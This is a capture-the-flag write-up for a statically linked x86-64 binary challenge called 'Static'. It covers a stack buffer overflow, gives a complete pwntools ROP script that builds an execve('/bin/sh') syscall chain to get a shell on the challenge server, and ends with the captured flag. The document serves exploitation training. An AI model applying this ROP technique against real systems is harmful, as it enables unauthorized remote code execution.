# Static

So I heard all about these binary exploitation attacks involving libraries and libc, and that's got me worried! I decided to statically compile all of my binaries to avoid those attack vectors. This means I don't need to worry about mitigations, right?

Right??

nc static.chal.cyberjousting.com 1350

## Challenge

Running the binary didn't give much insight as it seems to just read input, so lets do some checks and get into decompiling it.

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```


```c
void vuln(void)

{
  undefined local_12 [10];
  
  read(0,local_12,256);
  return;
}
```

So again we have a very simple vuln function that has a simple buffer overflow. Now the only real differences on this guy here is that the binary is statically linked and has NX enabled. There is a stack canary but not one that we need to worry about, as shown in the vuln function decompilation.

This was my first time exploiting a statically linked binary like this. I spent a few minutes scratching my head because I knew what statically linked meant but I didn't know how exactly to exploit it. My first thought was to look for `system` in the binary, but it wasnt there. After some googling I quickly came across [this technique](https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/rop-syscall-execv). After a little bit of reading I came to an understanding that this was a pretty simple rop challenge that just used what the binary had to offer.

There were three things I needed to achieve: overflowing into the return address, getting `/bin/sh` into writable memory, and then setting up registers for a syscall.

Using `ROPgadget` I was able to pick out some gadgets that would fit my use. They weren't perfect but we made do.

```python
from pwn import *

elf = context.binary = ELF('./static')
#p = process('./static')
p = remote('static.chal.cyberjousting.com', 1350)

#Gadgets
pop_rdi = 0x0000000000401fe0
pop_rsi = 0x00000000004062d8
pop_rax_rdx_rbx = 0x000000000045e466
mov_rax_rdx_pop_rbx = 0x0000000000467180
syscall = 0x0000000000401194
writable_mem = 0x000000000049d000
ret = pop_rdi + 1

rop = p64(ret)

#Assigning rax writable memory address and rdx the string we want
rop += p64(pop_rax_rdx_rbx)
rop += p64(writable_mem) + b"/bin/sh\x00" + p64(0)

#Moving the string into writable memory for access
rop += p64(mov_rax_rdx_pop_rbx)
rop += p64(0)

#Rax to 0x3b, rdx to 0
rop += p64(pop_rax_rdx_rbx)
rop += p64(0x3b) + p64(0) + p64(0)

#Rdi to our string and rsi to 0
rop += p64(pop_rdi)
rop += p64(writable_mem)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(syscall)

payload = b'A'*10 + rop
p.sendline(payload)
p.interactive()
```

The solve script does exactly that. It gets us into the return address, writes `/bin/sh` into rdx, then movs [rdx] into rax, then fills the registers with our desired values in order to call `execve`. And after calling we have achieved a shell on the server. 

## Flag

`byuctf{glaD_you_c0uld_improvise_ROP_with_no_provided_gadgets!}`